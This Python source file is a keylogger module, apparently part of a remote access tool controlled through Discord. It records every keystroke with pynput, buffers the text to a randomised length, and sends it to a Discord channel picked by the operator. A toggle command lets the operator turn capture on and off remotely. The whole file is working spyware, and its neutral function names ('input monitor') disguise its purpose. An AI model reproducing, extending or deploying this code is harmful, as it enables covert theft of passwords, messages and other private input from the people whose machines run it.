import asyncio
import random
from queue import Queue
from pynput.keyboard import Listener

buffer = ""
data_queue = Queue()
listener = None

def log_input_event(key):
    global buffer
    try:
        from pynput.keyboard import Key

        keymap = {
            Key.space: ' ',
            Key.enter: '[ENTER]',
            Key.tab: '[TAB]',
            Key.backspace: '[BACKSPACE]',
            Key.shift: '[SHIFT]',
            Key.caps_lock: '[C-LOCK]',
            Key.esc: '[ESC]',
            Key.alt_l: '[ALT]',
            Key.alt_r: '[ALT]',
            Key.ctrl_l: '[CTRL]',
            Key.ctrl_r: '[CTRL]',
            Key.right: '[→]',
            Key.left: '[←]',
            Key.up: '[↑]',
            Key.down: '[↓]'
        }

        keypress = keymap.get(key, str(key).replace("'", ""))

        buffer += keypress
        if len(buffer) > random.randint(100, 150):
            data_queue.put(buffer)
            buffer = ""

    except Exception as e:
        print(f"Error handling input: {e}")

async def process_data_queue(bot, CHANNEL_ID):
    while True:
        if not data_queue.empty():
            data = data_queue.get_nowait()
            formatted_data = f"**Input Data:**\n{data}"
            await send_data_buffer(formatted_data, bot, CHANNEL_ID)
        await asyncio.sleep(1)

# Send data to Discord
async def send_data_buffer(data, bot, CHANNEL_ID):
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(data)

async def toggle_input_monitor(bot, CHANNEL_ID, input_monitor_active):
    global listener
    global buffer
    if input_monitor_active:
        if listener is not None:
            listener.stop()
        await asyncio.sleep(1)
        if buffer:
            await send_data_buffer(f"**Remaining Input Data:**\n{buffer}", bot, CHANNEL_ID)
        clear_data()
        await send_data_buffer("❌ **INPUT MONITORING DISABLED**", bot, CHANNEL_ID)
    else:
        await send_data_buffer("✅ **INPUT MONITORING ENABLED**", bot, CHANNEL_ID)
        start_input_monitor()
        asyncio.create_task(process_data_queue(bot, CHANNEL_ID))

# Start the input monitor
def start_input_monitor():
    global listener
    listener = Listener(on_press=log_input_event)
    listener.start()

# Clear the buffer
def clear_data():
    global buffer
    buffer = "" 
